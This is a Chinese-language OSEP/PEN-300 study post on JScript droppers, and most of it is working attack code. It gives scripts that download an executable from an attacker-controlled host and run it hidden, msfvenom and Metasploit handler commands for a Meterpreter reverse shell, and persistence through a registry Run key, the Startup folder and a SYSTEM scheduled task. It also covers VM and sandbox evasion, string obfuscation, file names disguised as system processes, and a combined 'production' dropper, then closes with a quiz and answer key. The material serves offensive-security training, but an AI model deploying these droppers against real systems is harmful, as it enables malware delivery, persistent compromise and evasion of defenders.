---
title: OSEP-04-Jscript-Dropper
description: '04-JScript攻击 | 03-Jscript-Dropper'
pubDate: 2026-01-30T00:00:30+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Phishing
---

# Module 4: Windows Script Host 攻击

## 第二节：Jscript Dropper

### 什么是 Dropper？

在上一个模块中我们学习了 Dropper 的概念。现在我们用 Jscript 来实现一个完整的 Dropper。

**Jscript Dropper 的优势**：
- 双击即可执行，无需用户额外操作
- 没有执行策略限制（不像 PowerShell）
- 可以通过邮件附件传播
- 代码可读性好，易于修改和混淆

---

## 一、简单的 Jscript Dropper

### 1.1 基本结构

```javascript
// dropper.js - 基本的下载执行 Dropper

// 配置
var url = "http://192.168.1.100/payload.exe";
var savePath = "C:\\Windows\\Temp\\update.exe";

// 步骤 1: 下载文件
var http = new ActiveXObject("MSXML2.XMLHTTP");
http.Open("GET", url, false);
http.Send();

// 步骤 2: 检查下载是否成功
if (http.Status == 200) {
    // 步骤 3: 保存文件
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Open();
    stream.Type = 1;  // 二进制模式
    stream.Write(http.ResponseBody);
    stream.Position = 0;
    stream.SaveToFile(savePath, 2);  // 2 = 覆盖已存在的文件
    stream.Close();

    // 步骤 4: 执行文件
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run(savePath, 0);  // 0 = 隐藏窗口
}
```

### 1.2 流程图

```
用户双击 .js 文件
        │
        ▼
┌───────────────────┐
│  创建 HTTP 对象   │
│  MSXML2.XMLHTTP   │
└─────────┬─────────┘
          │
          ▼
┌───────────────────┐
│  发送 GET 请求    │
│  下载 payload     │
└─────────┬─────────┘
          │
          ▼
┌───────────────────┐
│  检查 HTTP 状态   │
│  Status == 200?   │
└─────────┬─────────┘
          │
    ┌─────┴─────┐
    │           │
   Yes         No
    │           │
    ▼           ▼
┌─────────┐  ┌─────────┐
│保存文件 │  │  退出   │
│到磁盘   │  │         │
└────┬────┘  └─────────┘
     │
     ▼
┌─────────────────┐
│  执行 payload   │
│  WScript.Shell  │
└─────────────────┘
```

---

## 二、完整的 Meterpreter Dropper

### 2.1 生成 Payload

```bash
# 在 Kali 上生成 Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.100 \
    LPORT=443 \
    -f exe \
    -o /var/www/html/met.exe

# 启动 Web 服务器
sudo systemctl start apache2

# 设置监听器
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.100
set LPORT 443
run
```

### 2.2 Jscript Dropper 代码

```javascript
// meterpreter_dropper.js

var url = "http://192.168.1.100/met.exe";
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200) {
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

---

## 三、增强版 Dropper

### 3.1 添加错误处理

```javascript
// enhanced_dropper.js

try {
    var url = "http://192.168.1.100/met.exe";
    var savePath = "C:\\Users\\Public\\update.exe";

    // 下载
    var http = WScript.CreateObject('MSXML2.XMLHTTP');
    http.Open('GET', url, false);
    http.Send();

    if (http.Status == 200) {
        // 保存
        var stream = WScript.CreateObject('ADODB.Stream');
        stream.Open();
        stream.Type = 1;
        stream.Write(http.ResponseBody);
        stream.Position = 0;
        stream.SaveToFile(savePath, 2);
        stream.Close();

        // 执行
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run(savePath, 0, false);  // false = 不等待执行完成
    }
} catch(e) {
    // 静默失败，不显示错误
}
```

### 3.2 添加代理支持

```javascript
// proxy_aware_dropper.js
// 企业环境通常有代理服务器

var url = "http://192.168.1.100/met.exe";
var proxyServer = "http://proxy.corp.local:8080";

var http = WScript.CreateObject('MSXML2.ServerXMLHTTP');

// 设置代理
http.setProxy(2, proxyServer);  // 2 = 使用指定代理

http.Open('GET', url, false);
http.Send();

if (http.Status == 200) {
    var stream = WScript.CreateObject('ADODB.Stream');
    stream.Open();
    stream.Type = 1;
    stream.Write(http.ResponseBody);
    stream.Position = 0;
    stream.SaveToFile("update.exe", 2);
    stream.Close();

    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("update.exe", 0);
}
```

### 3.3 使用系统代理设置

```javascript
// system_proxy_dropper.js
// 自动使用系统配置的代理

var url = "http://192.168.1.100/met.exe";

// WinHttp.WinHttpRequest 会自动使用系统代理
var http = WScript.CreateObject('WinHttp.WinHttpRequest.5.1');

http.Open('GET', url, false);
http.Send();

if (http.Status == 200) {
    var stream = WScript.CreateObject('ADODB.Stream');
    stream.Open();
    stream.Type = 1;
    stream.Write(http.ResponseBody);
    stream.Position = 0;
    stream.SaveToFile("update.exe", 2);
    stream.Close();

    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("update.exe", 0);
}
```

---

## 四、隐蔽执行技术

### 4.1 随机文件名

```javascript
// random_filename_dropper.js

function randomString(length) {
    var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    var result = "";
    for (var i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

var url = "http://192.168.1.100/met.exe";
var filename = randomString(8) + ".exe";
var savePath = "C:\\Users\\Public\\" + filename;

// ... 下载和执行代码 ...
```

### 4.2 使用临时目录

```javascript
// temp_dir_dropper.js

var shell = new ActiveXObject("WScript.Shell");
var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");
var filename = "svchost_" + Math.floor(Math.random() * 10000) + ".exe";
var savePath = tempDir + "\\" + filename;

// ... 下载和执行代码 ...
```

### 4.3 伪装成合法程序

```javascript
// disguised_dropper.js

var shell = new ActiveXObject("WScript.Shell");
var appdata = shell.ExpandEnvironmentStrings("%APPDATA%");

// 创建看起来合法的目录结构
var fso = new ActiveXObject("Scripting.FileSystemObject");
var targetDir = appdata + "\\Microsoft\\Windows\\Update";

if (!fso.FolderExists(targetDir)) {
    fso.CreateFolder(targetDir);
}

var savePath = targetDir + "\\WindowsUpdate.exe";

// ... 下载和执行代码 ...
```

---

## 五、持久化技术

### 5.1 注册表启动项

```javascript
// persistence_registry.js

var shell = new ActiveXObject("WScript.Shell");
var payloadPath = "C:\\Users\\Public\\update.exe";

// 添加到当前用户启动项
shell.RegWrite(
    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
    payloadPath,
    "REG_SZ"
);
```

### 5.2 启动文件夹

```javascript
// persistence_startup.js

var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

// 获取启动文件夹路径
var startupFolder = shell.SpecialFolders("Startup");
var payloadPath = "C:\\Users\\Public\\update.exe";

// 复制到启动文件夹
fso.CopyFile(payloadPath, startupFolder + "\\update.exe");
```

### 5.3 计划任务

```javascript
// persistence_schtask.js

var shell = new ActiveXObject("WScript.Shell");
var payloadPath = "C:\\Users\\Public\\update.exe";

// 创建计划任务（每次登录时运行）
var cmd = 'schtasks /create /tn "WindowsUpdate" /tr "' + payloadPath + '" /sc onlogon /ru System /f';
shell.Run(cmd, 0, true);
```

---

## 六、反检测技术

### 6.1 延迟执行

```javascript
// delayed_dropper.js
// 延迟执行可以绑定某些沙箱检测

function sleep(ms) {
    var start = new Date().getTime();
    while (new Date().getTime() < start + ms);
}

// 延迟 30 秒
sleep(30000);

// 然后执行恶意代码
// ...
```

### 6.2 环境检测

```javascript
// sandbox_detection.js

var shell = new ActiveXObject("WScript.Shell");

// 检测是否在虚拟机中
function isVM() {
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var items = wmi.ExecQuery("SELECT * FROM Win32_ComputerSystem");
        var e = new Enumerator(items);

        for (; !e.atEnd(); e.moveNext()) {
            var item = e.item();
            var manufacturer = item.Manufacturer.toLowerCase();
            var model = item.Model.toLowerCase();

            if (manufacturer.indexOf("vmware") >= 0 ||
                manufacturer.indexOf("virtual") >= 0 ||
                model.indexOf("virtual") >= 0) {
                return true;
            }
        }
    } catch(e) {}
    return false;
}

// 检测用户交互
function hasUserInteraction() {
    // 检查最近的文件数量
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var recentFolder = shell.SpecialFolders("Recent");
    var folder = fso.GetFolder(recentFolder);
    return folder.Files.Count > 10;
}

// 只在真实环境中执行
if (!isVM() && hasUserInteraction()) {
    // 执行恶意代码
}
```

### 6.3 代码混淆

```javascript
// obfuscated_dropper.js
// 简单的字符串混淆

// 原始: "WScript.Shell"
var _0x1 = ["W","S","c","r","i","p","t",".","S","h","e","l","l"];
var shellName = _0x1.join("");

// 原始: "MSXML2.XMLHTTP"
var _0x2 = String.fromCharCode(77,83,88,77,76,50,46,88,77,76,72,84,84,80);

var shell = new ActiveXObject(shellName);
var http = new ActiveXObject(_0x2);

// ... 其余代码 ...
```

---

## 七、完整的生产级 Dropper

```javascript
// production_dropper.js
// 综合了多种技术的 Dropper

(function() {
    // 配置
    var CONFIG = {
        url: "http://192.168.1.100/payload.exe",
        delay: 5000,
        retries: 3
    };

    // 工具函数
    function getRandomName() {
        var names = ["svchost", "csrss", "lsass", "services", "winlogon"];
        return names[Math.floor(Math.random() * names.length)] +
               "_" + Math.floor(Math.random() * 10000) + ".exe";
    }

    function sleep(ms) {
        var start = new Date().getTime();
        while (new Date().getTime() < start + ms);
    }

    function download(url) {
        var http = WScript.CreateObject('WinHttp.WinHttpRequest.5.1');
        http.Open('GET', url, false);
        http.Send();
        return http.Status == 200 ? http.ResponseBody : null;
    }

    function saveFile(data, path) {
        var stream = WScript.CreateObject('ADODB.Stream');
        stream.Open();
        stream.Type = 1;
        stream.Write(data);
        stream.Position = 0;
        stream.SaveToFile(path, 2);
        stream.Close();
    }

    function execute(path) {
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run(path, 0, false);
    }

    // 主逻辑
    function main() {
        try {
            // 延迟执行
            sleep(CONFIG.delay);

            // 准备路径
            var shell = new ActiveXObject("WScript.Shell");
            var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");
            var savePath = tempDir + "\\" + getRandomName();

            // 下载（带重试）
            var data = null;
            for (var i = 0; i < CONFIG.retries && !data; i++) {
                data = download(CONFIG.url);
                if (!data) sleep(2000);
            }

            if (data) {
                saveFile(data, savePath);
                execute(savePath);
            }
        } catch(e) {
            // 静默失败
        }
    }

    main();
})();
```

---

## 八、章节测试

### 选择题

1. ADODB.Stream 的 Type 属性设置为 1 表示什么？
   - A) 文本模式
   - B) 二进制模式
   - C) 追加模式
   - D) 只读模式

2. SaveToFile 方法的第二个参数设置为 2 表示什么？
   - A) 追加到文件
   - B) 创建新文件
   - C) 覆盖已存在的文件
   - D) 只读打开

3. WScript.Shell.Run 的第二个参数设置为 0 表示什么？
   - A) 等待执行完成
   - B) 隐藏窗口
   - C) 最大化窗口
   - D) 最小化窗口

4. 以下哪个对象可以自动使用系统代理设置？
   - A) MSXML2.XMLHTTP
   - B) MSXML2.ServerXMLHTTP
   - C) WinHttp.WinHttpRequest.5.1
   - D) Scripting.FileSystemObject

5. 在 Jscript 中，如何获取临时目录路径？
   - A) WScript.TempFolder
   - B) shell.ExpandEnvironmentStrings("%TEMP%")
   - C) fso.GetTempFolder()
   - D) System.IO.Path.GetTempPath()

### 实践题

1. 编写一个 Jscript Dropper，从指定 URL 下载文件并保存到临时目录。

2. 修改 Dropper，添加 5 秒延迟后再执行下载。

### 答案

**选择题**：1-B, 2-C, 3-B, 4-C, 5-B

---

**下一节**：[04-DotNetToJscript.md](/blog/osep/04-jscript攻击/04-dotnettojscript/) - 使用 DotNetToJscript 执行 C# 代码
